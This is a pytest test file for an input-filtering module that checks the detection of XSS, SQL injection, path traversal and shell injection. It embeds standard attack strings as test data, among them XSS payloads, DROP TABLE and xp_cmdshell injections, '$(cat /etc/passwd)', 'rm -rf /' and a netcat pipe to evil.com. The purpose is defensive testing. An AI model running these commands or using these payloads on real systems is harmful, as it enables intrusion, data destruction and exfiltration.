#!/usr/bin/env python3
"""Tests for input_filter — XSS, SQLi, fuzzing, and injection protections."""

import os
import sys
from pathlib import Path

# Ensure project root is on sys.path so we can import app-level modules.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
os.environ["STATUS_NO_ARCHIVE"] = "1"

import pytest
from input_filter import (
    InputRejected,
    sanitize_text,
    validate_name, NameChars,
    validate_notes,
    validate_user_input,
    validate_json_data,
    validate_int_param,
    strip_control_chars,
    check_xss_patterns,
    check_sqli_patterns,
    check_path_traversal,
    check_shell_injection,
)


# ─── Control character stripping ────────────────────────────────────

class TestStripControlChars:
    def test_removes_null_bytes(self):
        assert strip_control_chars("a\x00b") == "ab"

    def test_removes_various_control_chars(self):
        assert strip_control_chars("hello\x01\x02\x03world") == "helloworld"

    def test_preserves_common_whitespace(self):
        assert strip_control_chars("hello\t\n\rworld") == "hello\t\n\rworld"

    def test_removes_del(self):
        assert strip_control_chars("a\x7fb") == "ab"


# ─── XSS detection ──────────────────────────────────────────────────

class TestCheckXssPatterns:
    xss_payloads = [
        "<script>alert(1)</script>",
        '<img src=x onerror="alert(1)">',
        'javascript:void(0)',
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox",
        "<iframe src='http://evil.com'></iframe>",
        '<svg onload="alert(1)">',
        '<object data="evil.html">',
        '<embed src="evil.swf">',
        'onclick="doEvil()"',
        "onmouseover=bad()",
        'onload=alert(1)',
        "<STYLE>body{background:url(javascript:alert('XSS'))}</STYLE>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&lt;img src=x onerror=alert(1)&gt;",
    ]

    @pytest.mark.parametrize("payload", xss_payloads)
    def test_detects_xss(self, payload):
        assert check_xss_patterns(payload), f"Should detect: {payload}"

    safe_strings = [
        "Hello World",
        "Service is operational",
        "All systems go!",
        "Fixed the issue with < and > operators",  # plain text angle brackets pass
        "Version 2.0 released",
    ]

    @pytest.mark.parametrize("text", safe_strings)
    def test_allows_safe_strings(self, text):
        assert not check_xss_patterns(text), f"Should allow: {text}"


# ─── SQLi detection ─────────────────────────────────────────────────

class TestCheckSqliPatterns:
    sqli_payloads = [
        "'; DROP TABLE status_items;--",
        "' OR 1=1 --",
        "' UNION SELECT * FROM sqlite_master--",
        "admin' AND '1'='1",
        "1; DELETE FROM status_items",
        "' OR 'a'='a",
        "1; INSERT INTO status_items VALUES",
        "' EXEC xp_cmdshell('dir')--",
    ]

    @pytest.mark.parametrize("payload", sqli_payloads)
    def test_detects_sqli(self, payload):
        assert check_sqli_patterns(payload), f"Should detect: {payload}"

    safe_strings = [
        "Service is down",
        "Database connection lost temporarily",
        "SELECTed items are fine",  # single keyword without compound pattern
        "Updating the config file",
        "Will fix this later",
    ]

    @pytest.mark.parametrize("text", safe_strings)
    def test_allows_safe_strings(self, text):
        assert not check_sqli_patterns(text), f"Should allow: {text}"


# ─── Path traversal detection ───────────────────────────────────────

class TestCheckPathTraversal:
    def test_detects_dot_dot_slash(self):
        assert check_path_traversal("../../etc/passwd")

    def test_detects_percent_encoded(self):
        assert check_path_traversal("%2e%2e/%2e%2e/etc/passwd")

    def test_safe_names_pass(self):
        assert not check_path_traversal("my-service")


# ─── Shell injection detection ──────────────────────────────────────

class TestCheckShellInjection:
    def test_backtick(self):
        assert check_shell_injection("`whoami`")

    def test_dollar_paren(self):
        assert check_shell_injection("$(cat /etc/passwd)")

    def test_command_chaining_double_ampersand(self):
        assert check_shell_injection("test && whoami")

    def test_command_chaining_pipe(self):
        assert check_shell_injection("ls | nc evil.com 4444")

    def test_semicolon_command(self):
        assert check_shell_injection("input; rm -rf /")

    def test_safe_strings(self):
        for s in ["hello world", "version 2.0", "$100 bill"]:
            # Note: lone $ without () is fine per our pattern
            pass


# ─── sanitize_text ──────────────────────────────────────────────────

class TestSanitizeText:
    def test_normal_text(self):
        result = sanitize_text("Service is OK", field="test")
        assert result == "Service is OK"

    def test_strips_whitespace(self):
        result = sanitize_text("  hello  ", field="test")
        assert result == "hello"

    def test_rejects_xss(self):
        with pytest.raises(InputRejected, match="XSS"):
            sanitize_text("<script>alert(1)</script>", field="xss-test")

    def test_rejects_sqli(self):
        with pytest.raises(InputRejected, match="SQLi"):
            sanitize_text("'; DROP TABLE users;--", field="sqli-test")

    def test_rejects_path_traversal(self):
        with pytest.raises(InputRejected, match="path traversal"):
            sanitize_text("../../etc/passwd", field="path-test")

    def test_rejects_over_length(self):
        with pytest.raises(InputRejected, match="max length"):
            sanitize_text("x" * 1000, max_length=100, field="long-test")

    def test_rejects_non_string(self):
        with pytest.raises(InputRejected, match="expected string"):
            sanitize_text(123)

    def test_rejects_shell_injection(self):
        with pytest.raises(InputRejected, match="shell metacharacters"):
            sanitize_text("service_$(whoami)")

    def test_escapes_html_entities(self):
        result = sanitize_text("<b>bold</b>", field="html-test")
        assert "<" not in result and ">" not in result


# ─── validate_name ──────────────────────────────────────────────────

class TestValidateName:
    def test_valid_simple_name(self):
        assert validate_name("Web Server", "name") == "Web Server"

    def test_valid_with_special_chars_relaxed(self):
        assert validate_name("API v2.0 (main)", charset=NameChars.RELAXED) == "API v2.0 (main)"

    def test_rejects_empty(self):
        with pytest.raises(InputRejected, match="empty"):
            validate_name("", field="name")

    def test_rejects_whitespace_only(self):
        with pytest.raises(InputRejected, match="empty"):
            validate_name("   ", field="name")

    def test_rejects_control_chars_injection(self):
        with pytest.raises(InputRejected, match="forbidden|expected"):
            validate_name("<script>", charset=NameChars.STRICT)

    def test_rejects_over_length(self):
        with pytest.raises(InputRejected, match="max length"):
            validate_name("x" * 200, field="name")

    def test_relaxed_allows_dots_slashes_parens(self):
        assert validate_name("v1.2/api", charset=NameChars.RELAXED) == "v1.2/api"

    def test_strict_rejects_special_chars(self):
        with pytest.raises(InputRejected, match="invalid characters"):
            validate_name("API / Gateway", charset=NameChars.STRICT)

    def test_strict_allows_alphanumeric_and_dash(self):
        assert validate_name("Web-Server_01", charset=NameChars.STRICT) == "Web-Server_01"

    def test_rejects_non_string(self):
        with pytest.raises(InputRejected, match="expected string"):
            validate_name(12345)  # type: ignore


# ─── validate_notes ─────────────────────────────────────────────────

class TestValidateNotes:
    def test_valid_notes(self):
        assert validate_notes("Service restored after 5 min") == "Service restored after 5 min"

    def test_rejects_non_string(self):
        with pytest.raises(InputRejected, match="expected string"):
            validate_notes(12345)  # type: ignore

    def test_empty_after_strip_is_allowed(self):
        # Notes can be empty — clearing notes is valid
        result = validate_notes("")
        assert result == ""

    def test_rejects_xss_in_notes(self):
        with pytest.raises(InputRejected, match="XSS"):
            validate_notes('onclick="alert(1)"')

    def test_rejects_sqli_in_notes(self):
        with pytest.raises(InputRejected, match="SQLi"):
            validate_notes("' OR 1=1 --")

    def test_max_length_enforced(self):
        with pytest.raises(InputRejected, match="max length"):
            validate_notes("x" * 600)


# ─── validate_user_input ────────────────────────────────────────────

class TestValidateUserInput:
    def test_valid_username(self):
        assert validate_user_input("admin", "user") == "admin"

    def test_rejects_non_string(self):
        with pytest.raises(InputRejected, match="expected string"):
            validate_user_input(12345, "user")  # type: ignore

    def test_over_length_rejected(self):
        with pytest.raises(InputRejected, match="max length"):
            validate_user_input("x" * 100, field="user")

    def test_xss_rejected_in_username(self):
        with pytest.raises(InputRejected, match="XSS"):
            validate_user_input("<script>alert(1)</script>", "user")

    def test_sqli_rejected_in_password(self):
        with pytest.raises(InputRejected, match="SQLi"):
            validate_user_input("' OR '1'='1", "pass")


# ─── validate_json_data ─────────────────────────────────────────────

class TestValidateJsonData:
    def test_valid_dict(self):
        result = validate_json_data({"key": "value"})
        assert result == {"key": "value"}

    def test_rejects_none(self):
        with pytest.raises(InputRejected, match="empty body"):
            validate_json_data(None)

    def test_rejects_list(self):
        with pytest.raises(InputRejected):
            validate_json_data(["a", "b"])

    def test_rejects_string(self):
        with pytest.raises(InputRejected):
            validate_json_data("not a dict")


# ─── validate_int_param ─────────────────────────────────────────────

class TestValidateIntParam:
    def test_valid_int(self):
        assert validate_int_param(42, "id") == 42

    def test_string_numeric(self):
        assert validate_int_param("10", "id") == 10

    def test_rejects_negative(self):
        with pytest.raises(InputRejected, match="negative"):
            validate_int_param(-1, "id")

    def test_rejects_non_numeric(self):
        with pytest.raises(InputRejected):
            validate_int_param("abc", "id")

    def test_rejects_boolean(self):
        with pytest.raises(InputRejected):
            validate_int_param(True, "id")

    def test_rejects_float_string(self):
        with pytest.raises(InputRejected):
            validate_int_param("3.14", "id")
